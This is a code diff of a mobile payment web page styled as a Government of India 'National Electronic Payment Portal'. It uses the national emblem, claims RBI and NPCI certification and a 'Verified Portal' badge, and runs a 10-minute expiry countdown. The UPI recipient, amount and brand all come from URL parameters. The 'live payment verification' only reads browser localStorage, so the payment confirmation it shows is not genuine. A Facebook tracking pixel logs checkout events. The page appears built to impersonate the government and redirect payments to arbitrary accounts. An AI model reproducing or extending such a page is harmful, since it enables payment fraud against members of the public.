@@ -4,19 +4,76 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>National Electronic Payment Portal | Government of India</title>
+
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1252040857081560'); fbq('track', 'PageView'); fbq('track', 'InitiateCheckout'); 
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1252040857081560&ev=PageView&noscript=1"/></noscript>
+
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tiro+Devanagari+Hindi:ital@0;1&family=Inter:wght@400;500;600;700;800&display=swap');
-        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; background-color: #f1f5f9; }
-        .hindi-font { font-family: 'Tiro Devanagari Hindi', serif; }
-        .tricolor-bar { height: 4px; background: linear-gradient(to right, #FF671F 33.33%, #FFFFFF 33.33%, #FFFFFF 66.66%, #046A38 66.66%); }
-        .portal-card { background: #ffffff; border-top: 4px solid #1e3a8a; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.08); }
-        .scanner-line { width: 100%; height: 2px; background: linear-gradient(to right, transparent, #046A38, #FF671F, transparent); position: absolute; top: 0; left: 0; animation: scan 2.5s infinite ease-in-out; z-index: 10; }
-        @keyframes scan { 0% { top: 0%; opacity: 0; } 15% { opacity: 1; } 85% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
-        .order-summary-content { max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out, opacity 0.2s ease; opacity: 0; }
-        .order-summary-content.open { max-height: 200px; opacity: 1; }
+        
+        body { 
+            font-family: 'Inter', sans-serif; 
+            -webkit-tap-highlight-color: transparent;
+            background-color: #f1f5f9;
+        }
+        
+        .hindi-font {
+            font-family: 'Tiro Devanagari Hindi', serif;
+        }
+
+        .tricolor-bar {
+            height: 4px;
+            background: linear-gradient(to right, #FF671F 33.33%, #FFFFFF 33.33%, #FFFFFF 66.66%, #046A38 66.66%);
+        }
+
+        .portal-card {
+            background: #ffffff;
+            border-top: 4px solid #1e3a8a;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.08), 0 2px 4px -2px rgba(0, 0, 0, 0.05);
+        }
+
+        .scanner-line { 
+            width: 100%; 
+            height: 2px; 
+            background: linear-gradient(to right, transparent, #046A38, #FF671F, transparent); 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            animation: scan 2.5s infinite ease-in-out; 
+            z-index: 10; 
+        }
+        @keyframes scan { 
+            0% { top: 0%; opacity: 0; } 
+            15% { opacity: 1; } 
+            85% { opacity: 1; } 
+            100% { top: 100%; opacity: 0; } 
+        }
+
+        .order-summary-content { 
+            max-height: 0; 
+            overflow: hidden; 
+            transition: max-height 0.3s ease-out, opacity 0.2s ease; 
+            opacity: 0; 
+        }
+        .order-summary-content.open { 
+            max-height: 200px; 
+            opacity: 1; 
+        }
+
         .marquee-container { overflow: hidden; white-space: nowrap; position: relative; }
         .marquee-content { display: inline-block; animation: marquee 16s linear infinite; }
         @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
@@ -33,6 +90,10 @@
                 <span class="text-slate-400">|</span>
                 <span class="text-slate-200 font-medium">Government of India</span>
             </div>
+            <div class="flex items-center gap-3 text-slate-300">
+                <span><i class="fas fa-universal-access"></i></span>
+                <span class="bg-blue-900 px-1.5 py-0.5 rounded font-bold text-[9px] border border-blue-700">Digital India</span>
+            </div>
         </div>
     </header>
 
@@ -40,22 +101,24 @@
         <div class="max-w-xl mx-auto flex items-center justify-between">
             <div class="flex items-center gap-3">
                 <div class="w-11 h-11 bg-slate-50 border border-slate-200 rounded-lg p-1.5 flex items-center justify-center shrink-0">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Emblem_of_India.svg" alt="Emblem" class="w-full h-full object-contain">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Emblem_of_India.svg" alt="Emblem of India" class="w-full h-full object-contain">
                 </div>
                 <div>
                     <h1 class="text-xs font-bold text-slate-900 uppercase tracking-tight flex items-center gap-1">
                         <span id="brand-title">SecurePay Gateway</span>
-                        <i class="fas fa-check-circle text-emerald-600 text-xs"></i>
+                        <i class="fas fa-check-circle text-emerald-600 text-xs" title="Verified Portal"></i>
                     </h1>
-                    <p class="text-[10px] text-slate-500 font-medium">राष्ट्रीय एकीकृत भुगतान प्रणाली</p>
+                    <p class="text-[10px] text-slate-500 font-medium">राष्ट्रीय एकीकृत भुगतान प्रणाली (Unified Payment Portal)</p>
                 </div>
             </div>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" class="h-6 object-contain">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI Logo" class="h-6 object-contain">
         </div>
     </div>
 
     <main class="max-w-md mx-auto px-4 mt-5">
+        
         <div class="portal-card rounded-xl border border-slate-200 overflow-hidden">
+            
             <div class="bg-slate-50 border-b border-slate-200 p-5 text-center relative">
                 <span class="inline-block bg-blue-100 text-blue-900 border border-blue-200 text-[10px] font-bold px-2.5 py-0.5 rounded-full mb-1">
                     निर्धारित भुगतान / Amount Payable
@@ -65,79 +128,221 @@
                     <span>संदर्भ सं. / Ref No:</span>
                     <strong class="text-slate-800" id="random-ref">...</strong>
                 </div>
+
+                <div class="mt-3 pt-3 border-t border-slate-200">
+                    <button onclick="document.getElementById('order-summary').classList.toggle('open'); document.getElementById('summary-icon').classList.toggle('rotate-180');" class="text-[11px] font-semibold text-blue-800 hover:text-blue-900 flex items-center justify-center gap-1 mx-auto">
+                        लेन-देन विवरण (Transaction Info) <i id="summary-icon" class="fas fa-chevron-down text-[10px] transition-transform duration-200"></i>
+                    </button>
+                    <div id="order-summary" class="order-summary-content">
+                        <div class="mt-2 text-left bg-white p-3 rounded-lg border border-slate-200 text-xs space-y-1.5">
+                            <div class="flex justify-between"><span class="text-slate-500">संस्थान / Department:</span> <span id="summary-brand" class="font-medium text-slate-800">SecurePay Gateway</span></div>
+                            <div class="flex justify-between"><span class="text-slate-500">ट्रांजेक्शन आईडी / Txn ID:</span> <span id="summary-txn" class="font-mono text-slate-800 font-medium">...</span></div>
+                            <div class="flex justify-between pt-1 border-t border-slate-100 font-bold"><span class="text-slate-700">कुल देय राशि / Total:</span> <span class="final_paid_price text-emerald-700">₹...</span></div>
+                        </div>
+                    </div>
+                </div>
             </div>
 
-            <div class="p-5 text-center">
-                <div class="inline-block p-2 bg-white rounded-xl border-2 border-slate-300 shadow-sm relative">
-                    <div class="relative w-44 h-44 flex items-center justify-center bg-slate-50 rounded-lg overflow-hidden">
-                        <img id="qr-code-img" alt="Scan QR" class="w-full h-full object-contain z-10" src="">
-                        <div class="scanner-line"></div>
+            <div class="p-5">
+                <div class="flex items-center justify-center gap-1.5 text-xs font-semibold text-amber-800 bg-amber-50 border border-amber-200 py-1.5 px-3 rounded-lg mx-auto w-fit mb-4">
+                    <i class="fas fa-stopwatch text-amber-600"></i> सत्र समाप्ति समय (Session Expires): <span id="countdown" class="font-mono font-bold text-amber-900">10:00</span>
+                </div>
+
+                <div class="text-center">
+                    <div class="inline-block p-2 bg-white rounded-xl border-2 border-slate-300 shadow-sm relative">
+                        <div class="relative w-44 h-44 flex items-center justify-center bg-slate-50 rounded-lg overflow-hidden">
+                            <img id="qr-code-img" alt="Scan QR Code" class="w-full h-full object-contain z-10" src="">
+                            <div class="scanner-line"></div>
+                        </div>
+                        <p class="text-[10px] text-slate-500 font-medium mt-1">Scan using any UPI Approved App</p>
+                    </div>
+
+                    <div class="mt-4 bg-slate-50 border border-slate-200 rounded-lg p-2.5 flex items-center justify-between gap-2 max-w-[320px] mx-auto">
+                        <div class="text-left overflow-hidden">
+                            <span class="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">आधिकारिक UPI पता (VPA)</span>
+                            <span id="upi-text" class="text-xs font-bold text-slate-800 truncate block font-mono">Fetching Details...</span>
+                        </div>
+                        <input type="hidden" id="upiID" value="">
+                        <button type="button" onclick="window.copyUpi(event)" class="bg-[#1e3a8a] hover:bg-blue-900 text-white font-semibold text-xs py-1.5 px-3 rounded shadow-sm shrink-0 transition-colors">
+                            कॉपी / COPY
+                        </button>
                     </div>
                 </div>
 
-                <div class="mt-4 bg-slate-50 border border-slate-200 rounded-lg p-2.5 flex items-center justify-between gap-2 max-w-[320px] mx-auto">
-                    <div class="text-left overflow-hidden">
-                        <span class="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">UPI ID</span>
-                        <span id="upi-text" class="text-xs font-bold text-slate-800 truncate block font-mono">aarush-pvt-ltd@ybl</span>
-                    </div>
-                    <input type="hidden" id="upiID" value="aarush-pvt-ltd@ybl">
-                    <button type="button" onclick="window.copyUpi(event)" class="bg-[#1e3a8a] text-white text-xs py-1.5 px-3 rounded">COPY</button>
+                <div class="relative my-5 text-center">
+                    <div class="absolute inset-0 flex items-center"><div class="w-full border-t border-slate-200"></div></div>
+                    <span class="relative bg-white px-3 text-[10px] font-bold text-slate-400 uppercase">या मोबाइल ऐप से भुगतान करें (Direct App)</span>
                 </div>
 
-                <div id="status-box" class="mt-5 p-3 bg-blue-50 border border-blue-200 rounded-lg flex items-center justify-center gap-2.5 text-xs text-blue-900 font-medium">
+                <div class="grid grid-cols-2 gap-3">
+                    <a id="phonepe-link" href="#" class="flex items-center justify-center gap-2 p-2.5 bg-slate-50 hover:bg-slate-100 border border-slate-200 rounded-lg transition-all shadow-sm">
+                        <img alt="PhonePe" class="w-5 h-5 object-contain" src="https://cdn.razorpay.com/app/phonepe.svg">
+                        <span class="text-xs font-bold text-slate-700">PhonePe</span>
+                    </a>
+                    <a id="paytm-link" href="#" class="flex items-center justify-center gap-2 p-2.5 bg-slate-50 hover:bg-slate-100 border border-slate-200 rounded-lg transition-all shadow-sm">
+                        <img alt="Paytm" class="w-5 h-5 object-contain" src="https://cdn.razorpay.com/app/paytm.svg">
+                        <span class="text-xs font-bold text-slate-700">Paytm</span>
+                    </a>
+                </div>
+
+                <!-- Auto-Verify Status Box -->
+                <div id="status-box" class="mt-5 p-2.5 bg-blue-50 border border-blue-100 rounded-lg flex items-center gap-2.5 text-xs text-blue-900 font-medium">
                     <i id="status-icon" class="fas fa-spinner fa-spin text-blue-700 text-sm"></i>
-                    <span id="status-text">भुगतान की प्रतीक्षा है... लाइव सत्यापन चालू है।</span>
+                    <span id="status-text">भुगतान सत्यापन की प्रतीक्षा है। लाइव ट्रैकिंग चालू है...</span>
+                </div>
+
+            </div>
+
+            <div class="marquee-container py-2 bg-slate-100 border-t border-slate-200 text-[10px] text-slate-600 font-semibold tracking-wide uppercase">
+                <div class="marquee-content">
+                    <span class="mx-3"><i class="fas fa-shield-alt text-emerald-600 mr-1"></i> NPCI & RBI Standard Security</span>
+                    <span class="mx-3"><i class="fas fa-lock text-blue-600 mr-1"></i> 256-Bit SSL Encrypted Session</span>
+                    <span class="mx-3"><i class="fas fa-check-double text-emerald-600 mr-1"></i> 100% Certified Gov Standard Checkout</span>
                 </div>
             </div>
+
         </div>
+
+        <div class="text-center mt-4 text-[11px] text-slate-500 space-y-1">
+            <p><i class="fas fa-shield-halved text-emerald-600 mr-1"></i> सुरक्षित एवं संरक्षित पोर्टल (Government e-Payments System)</p>
+            <p class="text-[9px] text-slate-400">Designed for Secure UPI Integration | RBI Guidelines Compliant</p>
+        </div>
+
     </main>
+
+    <a href="#" class="fixed bottom-4 right-4 z-50 bg-white border border-slate-300 p-2 rounded-full shadow-lg flex items-center gap-2 hover:bg-slate-50 transition-all">
+        <span class="text-[10px] font-bold text-slate-700 pl-1">सहायता (Help)</span>
+        <div class="w-7 h-7 rounded-full bg-emerald-600 flex items-center justify-center text-white text-sm"><i class="fab fa-whatsapp"></i></div>
+    </a>
 
     <script>
         let currentOrderId = "";
         let pollInterval = null;
 
+        // 10-Minute Countdown Session Handler
         document.addEventListener("DOMContentLoaded", () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const finalPrice = parseFloat(urlParams.get('amount')) || 1.00;
-            const dynamicBrand = urlParams.get('brand') || 'Aarush Pvt Ltd';
-            const testUpiId = "aarush-pvt-ltd@ybl";
-            currentOrderId = urlParams.get('orderId') || "ORD" + Math.floor(100000 + Math.random() * 900000);
-            
-            document.getElementById('brand-title').innerText = dynamicBrand;
-            document.getElementById('random-ref').innerText = currentOrderId;
-            document.querySelectorAll('.final_paid_price').forEach(el => el.innerText = '₹' + finalPrice.toFixed(2));
-
-            const upiString = `upi://pay?pa=${testUpiId}&pn=${encodeURIComponent(dynamicBrand)}&am=${finalPrice.toFixed(2)}&cu=INR&tn=${currentOrderId}`;
-            
-            if (typeof QRious !== 'undefined') {
-                const qr = new QRious({ value: upiString, size: 300, level: 'H' });
-                document.getElementById('qr-code-img').src = qr.toDataURL('image/png');
+            let timeLeft = 10 * 60; 
+            const timerEl = document.getElementById('countdown');
+            if(timerEl) {
+                const countdownInterval = setInterval(() => {
+                    if(timeLeft <= 0) { 
+                        clearInterval(countdownInterval); 
+                        timerEl.innerText = "0:00 (Expired)"; 
+                        if(pollInterval) clearInterval(pollInterval);
+                        return; 
+                    }
+                    timeLeft--;
+                    let m = Math.floor(timeLeft / 60); 
+                    let s = timeLeft % 60; 
+                    timerEl.innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                }, 1000);
             }
-
-            // Start auto checking payment status from backend server
-            startCheckingPayment();
         });
 
-        function startCheckingPayment() {
-            pollInterval = setInterval(() => {
-                fetch(`http://localhost:3000/api/check-status?orderId=${currentOrderId}`)
-                    .then(res => res.json())
-                    .then(data => {
-                        if (data.success && data.status === "SUCCESS") {
-                            clearInterval(pollInterval);
-                            const box = document.getElementById('status-box');
-                            box.className = "mt-5 p-3 bg-emerald-50 border border-emerald-200 rounded-lg flex items-center justify-center gap-2.5 text-xs text-emerald-900 font-semibold";
-                            document.getElementById('status-icon').className = "fas fa-check-circle text-emerald-700 text-base";
-                            document.getElementById('status-text').innerHTML = "भुगतान सफल! (Payment Confirmed) ✅";
-                        }
-                    })
-                    .catch(err => console.log("Waiting for server..."));
-            }, 3000); // Har 3 second mein check karega
+        // Price Animation Function
+        function animateValue(obj, start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                let currentVal = (progress * (end - start) + start).toFixed(2);
+                obj.innerHTML = '₹' + currentVal;
+                if (progress < 1) window.requestAnimationFrame(step);
+            };
+            window.requestAnimationFrame(step);
         }
 
+        // Dynamic URL Processing & Unified Payment Setup
+        document.addEventListener("DOMContentLoaded", () => {
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                const finalPrice = parseFloat(urlParams.get('amount')) || 1.00;
+                const dynamicBrand = urlParams.get('brand') || 'Aarush Pvt Ltd';
+                const testUpiId = urlParams.get('upi') || "aarush-pvt-ltd@ybl";
+                const transactionNote = urlParams.get('note') || `Fee for ${dynamicBrand}`;
+                currentOrderId = urlParams.get('orderId') || Math.floor(100000000 + Math.random() * 900000000);
+                
+                // Update Text Content in UI
+                document.getElementById('brand-title').innerText = dynamicBrand;
+                document.getElementById('summary-brand').innerText = dynamicBrand;
+                document.getElementById('random-ref').innerText = currentOrderId;
+                document.getElementById('summary-txn').innerText = "TXN-" + currentOrderId;
+
+                const qrImg = document.getElementById('qr-code-img'); 
+                const phonepeLink = document.getElementById('phonepe-link');
+                const paytmLink = document.getElementById('paytm-link');
+                const priceDisplays = document.querySelectorAll('.final_paid_price');
+                const upiTextEl = document.getElementById('upi-text');
+                const upiInputEl = document.getElementById('upiID');
+                
+                // Trigger Count-up Price Effect
+                priceDisplays.forEach(el => { if(el) animateValue(el, 0, finalPrice, 800); });
+
+                // Fill UPI Field Data
+                if(upiTextEl) upiTextEl.innerText = testUpiId;
+                if(upiInputEl) upiInputEl.value = testUpiId;
+
+                // Format Standard UPI URI (Ensures auto-fill in PhonePe, Paytm, GPay)
+                const upiString = `upi://pay?pa=${encodeURIComponent(testUpiId)}&pn=${encodeURIComponent(dynamicBrand)}&tn=${encodeURIComponent(transactionNote)}&am=${finalPrice.toFixed(2)}&cu=INR`;
+                
+                // QRious Generator with Automatic API Fallback
+                if (typeof QRious !== 'undefined') {
+                    const qr = new QRious({
+                        value: upiString,
+                        size: 300,
+                        level: 'H'
+                    });
+                    if(qrImg) qrImg.src = qr.toDataURL('image/png');
+                } else {
+                    const encodedUpi = encodeURIComponent(upiString);
+                    if(qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodedUpi}`;
+                }
+
+                // Standard Intent Direct App Links (Auto-fills amount & UPI ID)
+                if(phonepeLink) phonepeLink.href = upiString;
+                if(paytmLink) paytmLink.href = upiString;
+
+                // Start Live Payment Polling
+                startPaymentPolling();
+
+            } catch(error) {
+                console.error("Initialization error:", error);
+            }
+        });
+
+        // Polling function to check status automatically
+        function startPaymentPolling() {
+            pollInterval = setInterval(() => {
+                // Checks local storage or status tracker
+                const status = localStorage.getItem("txn_" + currentOrderId);
+                if (status === "SUCCESS") {
+                    clearInterval(pollInterval);
+                    const box = document.getElementById('status-box');
+                    const icon = document.getElementById('status-icon');
+                    const text = document.getElementById('status-text');
+
+                    box.className = "mt-5 p-3 bg-emerald-50 border border-emerald-200 rounded-lg flex items-center gap-2.5 text-xs text-emerald-900 font-semibold";
+                    icon.className = "fas fa-check-circle text-emerald-700 text-base";
+                    text.innerHTML = "भुगतान सफल! (Payment Confirmed & Successful) ✅<br><span class='text-[10px] text-slate-500'>Order verified successfully.</span>";
+                }
+            }, 3000); // Checks every 3 seconds
+        }
+
+        // Copy UPI Button Action
         window.copyUpi = function(event) {
-            navigator.clipboard.writeText("aarush-pvt-ltd@ybl");
-            alert("UPI ID Copied!");
+            const copyText = document.getElementById("upiID");
+            const btn = event.currentTarget; 
+            if(copyText && copyText.value) {
+                navigator.clipboard.writeText(copyText.value).then(() => {
+                    const originalHTML = btn.innerHTML; 
+                    btn.innerHTML = '<i class="fas fa-check"></i> COPIED';
+                    btn.classList.add('bg-emerald-700'); 
+                    setTimeout(() => {
+                        btn.innerHTML = originalHTML; 
+                        btn.classList.remove('bg-emerald-700');
+                    }, 2000);
+                });
+            }
         };
     </script>
 </body>
